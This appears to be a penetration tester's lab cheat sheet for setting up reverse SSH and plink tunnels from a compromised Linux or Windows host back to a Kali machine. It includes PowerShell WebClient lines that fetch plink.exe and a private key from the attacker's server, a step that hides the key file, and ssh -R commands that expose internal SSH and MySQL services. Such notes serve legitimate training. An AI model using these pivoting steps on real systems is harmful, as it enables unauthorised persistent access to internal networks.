###########################################
#Protected REVERSE SSH session w/ PrivKeys#
###########################################

//RemoteBox
mkdir /tmp/gh05t
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/var/www/.ssh/id_rsa): /tmp/gh05t/id_rsa

chmod 600 /tmp/gh05t/id_rsa

cat /tmp/gh05t/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYYt8xuDbUK1fWFggavy7byn+PedA9uXc3QT0qloGzxluUqXIQz98jevDWd3hYSougfIh0zkF5YruXx6Yp1k7qvECaqNxh+YrRDxl8dnmESilxlu+Ar4wSWmEfGBtdy9FCFYwElQpikchAwBDvcw2a20t2C7/xYBcWZWiWgIldSpB+88nIEx6Gv+XdEYuD7zs5CGGF0+3scOnCBdDc8AhGt0Q5JitUucrStzZRZsiV03Zeb2bkHpeU6K8G1m1a8W+FgINKFo09l5w1SVGyPr/IT04OPNjoOpkJ9T75A/tmUZLsg7L2ycBJ1++VLbdNZTMAqMASTzsFjl4N1LC3Gz8T www-data@ajla

#Copy over private key to remote host

//LocalBox (~/.ssh/authorized_keys)
//vim ~/.ssh/authorized_keys
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYYt8xuDbUK1fWFggavy7byn+PedA9uXc3QT0qloGzxluUqXIQz98jevDWd3hYSougfIh0zkF5YruXx6Yp1k7qvECaqNxh+YrRDxl8dnmESilxlu+Ar4wSWmEfGBtdy9FCFYwElQpikchAwBDvcw2a20t2C7/xYBcWZWiWgIldSpB+88nIEx6Gv+XdEYuD7zs5CGGF0+3scOnCBdDc8AhGt0Q5JitUucrStzZRZsiV03Zeb2bkHpeU6K8G1m1a8W+FgINKFo09l5w1SVGyPr/IT04OPNjoOpkJ9T75A/tmUZLsg7L2ycBJ1++VLbdNZTMAqMASTzsFjl4N1LC3Gz8T www-data@ajla

 
//Connect to Local from Remote
ssh -Nf -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/dupes/id_rsa kali@192.168.119.250 -R 2222:10.5.5.11:22 -R 3333:10.5.5.11:3306

##########################################################################################

#############################################
#Protected REVERSE plink session w/ PrivKeys#
#############################################
#Need the latests plink for the newer authentication
wget https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe
wget https://the.earth.li/~sgtatham/putty/latest/w32/puttygen.exe

wine puttygen.exe

cat id_rsa.pub
---- BEGIN SSH2 PUBLIC KEY ----
Comment: "rsa-key-20221021"
AAAAB3NzaC1yc2EAAAADAQABAAABAQDl+8x/jV6goZMcZbK2+kce2IjOnr1mYi29
u9Y67pSly20P8GZin0gnkvfTfXZCO79MXjLsmPI0jFRE9eCy4zndfXMzf25Y7UfP
RjoowY03lLoqG9lJ+jrTSN2AjIzb1TtDTDDs5Gg+EGkkSz0YByEnCa6vvxlYl9V7
/tlc4SQFTYkckONpZWwBmLB1a+bAizcgvifqXN0paZG9odMFWrXp/WZlGbtNCgM/
OGw3Ilzb9xKH9Zlwf+luMvKWehdx/SOD1IXS+2hSLvPAkAtknsN3vgCkDDgKbZDs
unaEJWQ62Uqy7kLYm91UZWJcfhX9ifRTZdVO63DOtsMMWgk8Bw6P
---- END SSH2 PUBLIC KEY ----


#Need to fix the plink format for SSH
vim id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDl+8x/jV6goZMcZbK2+kce2IjOnr1mYi29u9Y67pSly20P8GZin0gnkvfTfXZCO79MXjLsmPI0jFRE9eCy4zndfXMzf25Y7UfPRjoowY03lLoqG9lJ+jrTSN2AjIzb1TtDTDDs5Gg+EGkkSz0YByEnCa6vvxlYl9V7/tlc4SQFTYkckONpZWwBmLB1a+bAizcgvifqXN0paZG9odMFWrXp/WZlGbtNCgM/OGw3Ilzb9xKH9Zlwf+luMvKWehdx/SOD1IXS+2hSLvPAkAtknsN3vgCkDDgKbZDsunaEJWQ62Uqy7kLYm91UZWJcfhX9ifRTZdVO63DOtsMMWgk8Bw6P kali@kali

//LocalBox (~/.ssh/authorized_keys)
//vim ~/.ssh/authorized_keys
//Having these declarations in the the authorized_keys file locks down the connection.
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD1+8x/jV6goZMcZbK2+kce2IjOnr1mYi29u9Y67pSly20P8GZin0gnkvfTfXZCO79MXjLsmPI0jFRE9eCy4zndfXMzf25Y7UfPRjoowY03lLoqG9lJ+jrTSN2AjIzb1TtDTDDs5Gg+EGkkSz0YByEnCa6vvxlYl9V7/tlc4SQFTYkckONpZWwBmLB1a+bAizcgvifqXN0paZG9odMFWrXp/WZlGbtNCgM/OGw3Ilzb9xKH9Zlwf+luMvKWehdx/SOD1IXS+2hSLvPAkAtknsN3vgCkDDgKbZDsunaEJWQ62Uqy7kLYm91UZWJcfhX9ifRTZdVO63DOtsMMWgk8Bw6P kali@kali

#Copy over plink/privatekey to remote host
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.187:80/plink.exe', 'C:\Users\Bethany\plink.exe')
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.187:80/id_rsa.ppk', 'C:\Users\Bethany\id_rsa.ppk')

#Make the private key hidden
attrib +S +H id_rsa

//Connect
echo y |.\plink.exe -ssh -N -i id_rsa.ppk kali@192.168.119.187 -R 127.0.0.1:6969:127.0.0.1:80

##########################################################################################

#/etc/ssh/sshd_config
//These settings are required to tunnel properly

PermitRootLogin no
StrictModes no
RSAAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile      .ssh/authorized_keys
PasswordAuthentication no
KbdInteractiveAuthentication no
UsePAM yes
AllowTcpForwarding yes
GatewayPorts yes
PermitTunnel yes
